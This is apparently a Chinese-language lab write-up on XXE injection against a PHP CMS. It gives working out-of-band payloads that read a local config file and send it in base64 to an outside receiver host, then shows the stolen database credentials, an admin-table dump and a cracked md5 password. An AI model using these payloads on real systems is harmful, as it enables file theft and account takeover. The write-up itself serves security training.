---
date: "2021-06-12T00:00:00Z"
description: XXE 实体注入
keywords: XXE, 安全
tags:
- XXE
- 安全
title: XXE 实体注入
---

# XXE 实体注入

### 好文推荐

> https://xz.aliyun.com/t/3357#toc-0
> https://cloud.tencent.com/developer/article/1690035

### XXE 认识

XML 文档有自己的一个格式规范，这个格式规范是由一个叫做 `DTD（document type definition） 的东西控制的，他就是长得下面这个样子`


```xml
<message>
    <receiver>Myself</receiver>
    <sender>Someone</sender>
    <header>TheReminder</header>
    <msg>This is an amazing book</msg>
    </message>
```

XXE(XML External Entity Injection) 全称为 XML 外部实体注入，从名字就能看出来，这是一个注入漏洞，注入的是什么？XML外部实体。(看到这里肯定有人要说：你这不是在废话)，固然，其实我这里废话只是想强调我们的利用点是 **外部实体** ，也是提醒读者将注意力集中于外部实体中，而不要被 XML 中其他的一些名字相似的东西扰乱了思维(**盯好外部实体就行了**)，如果能注入 外部实体并且成功解析的话。

![](https://nc0.cdn.zkaq.cn/md/8461/3aa55614330d30e2f0db490edf5ca2eb_55150.png)

>  注意

1. 使用了 DTD 声明， 类似有了 **变量** 替换的情况， 导致 **用户输入** 能够被执行。
2. 代码本身使用了 xml 解析函数 (类似 php 中的 `simplexml_load_string` ) ， 导致 **用户恶意输入** 被执行。

因此， **XXE实体注入** 也是一种逻辑漏洞

此外， 对于 **用户输入** ，也包含了外部引用，不用语言有不同支持


![](https://nc0.cdn.zkaq.cn/md/8461/918177ade41d82f71716dc29ded1f614_67482.png)



## 靶场练习

### 炮台概念介绍

```php
1.xml  // 使用 system 导入的外部 xml 实体
2.php  // 带外数据接收的炮台 (不一定是 php) ， 只要能接受发送过来的数据， 就是 2.php
3.txt  // 带外数据接收者。 这里使用 3.txt 是为了形象的表示数据信息
```

这里只是一句口诀而已。 不要纠结 `php, txt` 的后缀， 只要能满足 **接收(php)，存储(txt)** 的功能就行。


#### 1.xml

将数据发送到炮台

```xml
<!ENTITY % all
"<!ENTITY &#x25; send SYSTEM 'http://192.168.1.3/xxe/2.php?id=%file;'>"
>
%all;
```

其中 `http://192.168.1.3/xxe/2.php` 就是 `2.php` 带外接受炮台
其中 `id=%file` 就是 `3.txt` ， 带外数据接收者。



## 练习

### 1. 代码审计

通过代码审计， 找到 `weixin/index.php` 文件中， `31 ~ 35` 行代码有利用可能

**32行** 代码，使用 `file_get_contests` 获取了外部数据
**33行** 代码， 使用 `simplexml_load_string` 进行了解析

![](https://nc0.cdn.zkaq.cn/md/8461/0a809d087fd976e0fa5876d593f4d544_18950.png)

```
if ($signature != "" && $echostr == "") {
    $postArr = file_get_contents("php://input");
    $postObj = simplexml_load_string($postArr);
    $ToUserName = $postObj->FromUserName;
    $FromUserName = $postObj->ToUserName;
    $MsgType = $postObj->MsgType;
    $strEvent = $postObj->Event;
    $EventKey = $postObj->EventKey;
```


其中， 根据执行条件 
1. `signature!=""` 不为空
2. `echostr=""` 为空。 注意， **为空和不存在**  在编程语言中的判断中是不一样的。 **为空** 值的是 **变量`存在`**  但 **值** 为空。

因此构造出 POST 请求

```
POST /weixin/index.php?signature=123&echostr= HTTP/1.1
```



### 2. burpsuite 抓包改包


![](https://nc0.cdn.zkaq.cn/md/8461/dfd89b73ee11b7c7767c5b800c772e13_96007.png)


#### payload 解析

1. 读取 `../conn/conn.php` 文件 。 这里是针对文件  `/weixin/index.php` 的相对路径。 也可以是想要获取的其他文件的绝对路径， 例如 `/ect/password` 。
2. 使用 `convert.base64-encode` 进行编码， 为了数据保真。
3. 定义 DTD (remote)， 引入 `http://59.xx.xx.xx/1.xml` 的 **用户行为** , 其中定义了 `send`
4. 执行`%remote`
5. 执行`%send`

```xml

<?xml version="1.0"?>

<!DOCTYPE ANY[
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=../conn/conn.php">

<!ENTITY % remote SYSTEM "http://59.63.200.79:8017/1.xml"> 
%remote;
%send;
]>

```

### 3. 获取带外数据

访问 `http://59.63.200.79:8017/3.txt` 获取带外数据

```
文件修改服务器时间: 2021-04-25 16:47:39
PD9waHAKZXJyb3JfcmVwb3J0aW5nKEVfQUxMIF4gRV9OT1RJQ0UpOyAKaGVhZGVyKCJjb250ZW50LXR5cGU6dGV4dC9odG1sO2NoYXJzZXQ9dXRmLTgiKTsKc2Vzc2lvbl9zdGFydCgpOwokY29ubiA9IG15c3FsaV9jb25uZWN0KCIxOTIuMTY4LjAuMTAiLCJ4eGUiLCAidGVpd28hOCM3RVJlMURQQyIsICJzY21zIik7Cm15c3FsaV9xdWVyeSgkY29ubiwnc2V0IG5hbWVzIHV0ZjgnKTsKZGF0ZV9kZWZhdWx0X3RpbWV6b25lX3NldCgiUFJDIik7CmlmICghJGNvbm4pIHsKICAgIGRpZSgi5pWw5o2u5bqT6L e5o6l5aSx6LSlOiAiIC4gbXlzcWxpX2Nvbm5lY3RfZXJyb3IoKSk7Cn0KJGZ1bmN0aW9uZmlsZT1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSkuIi9kYXRhL2Z1bmN0aW9uLmJhcyI7CiRkYXRhZmlsZT0iZGF0YS9kYXRhLmJhcyI7CiRhamF4ZmlsZT0iZGF0YS9hamF4LmJhcyI7CiRhcGlmaWxlPSJkYXRhL2FwaS5iYXMiOwo/Pg==

```

#### 3.1 数据解析

使用命令 `base64 -d <<<"xxxxxxxx"` 解析数据。

这里有一点问题， 由于某种原因， 获取到的 base64 长度有问题导致无法解析 `Invalid character in input stream.` 。

> tips: 从最后往前， 每个字符依次删除， 在重新解析即可得出结论。
>> 原理: base64 就是针对每个字符进行编码。 字符越长， 编码越长。 无他。


![](https://nc0.cdn.zkaq.cn/md/8461/83f894de0b28a97519dd5e831521f956_92230.png)


```
<?php
error_reporting(E_ALL ^ E_NOTICE);
header("content-type:text/html;charset=utf-8");
session_start();
$conn = mysqli_connect("192.168.0.10","xxe", "teiwo!8#7ERe1DPC", "scms");
mysqli_query($conn,'set names utf8');
date_default_timezone_set("PRC");
```

结果中得出关键的数据链接信息

```
$conn = mysqli_connect("192.168.0.10","xxe", "teiwo!8#7ERe1DPC", "scms");
```

### 4. 登陆数据库

根据代码审计结果， cms 使用了 adminer 数据库管理工具。地址为 `http://xxxx/adminer.php`

#### 4.1 登陆

打开 `http://59.63.200.79:8207/adminer.php` 并登陆

#### 4.2 获取 admin 密码


```sql
-- 注意， 由于开启了大小写敏感， 这里不能写 sl_admin
select * from SL_admin;

-- admin  e99d2e51cbefe75251f1d40821e07a32
--        admintestv1
```

![](https://nc0.cdn.zkaq.cn/md/8461/2c11b26ed53f83e1ee1e0b9f65004a58_85419.png)


密码是通过 md5 加密的

```
342cc7208aea6f057f72075016fde59f_87770
```


### 5. md5 解码

![](https://nc0.cdn.zkaq.cn/md/8461/342cc7208aea6f057f72075016fde59f_87770.png)

揭秘结果

```
admintestv1
```


## 补充 

```
	XXE总结:
		XML外部实体注入 =>用户输入的数据被当做XML代码进行一个执行，然后利用DTD部分可以通过SYSTEM关键词发起网络请求从而获得数据

		XML很多时候执行但是没有输出，那么可以使用XXE炮台将数据外带出来
		1.xml 2.php 3.txt (固定写法)
		做事分几步走：第一步获取，第二步传输，第三步保存

		simplexml_load_string(XML代码)

		php伪协议：   
			php://input => 获取POST原始传参
			php://filter/read=convert.base64-encode/resource=C:/phpStudy/scms/conn/conn.php  => 读取文件然后转为base64

		靶场做法： 代码审计weixin.php xxe 去scms上打，获得数据库账户密码	adminer.php登录 获得后台账户密码。 提交

		小知识点： 一般用户传参会被检测，但是如果没有Content-Type: application/x-www-form-urlencoded，$_POST $_REQUEST 他就无法获取到POST的信息，所以检测容易绕过
```

课程中讲到的 `Content-Type: application/x-www-form-urlencoded` ， 在 burpsuite 抓包是， 使用 GET 改 POST 中并未遇到。

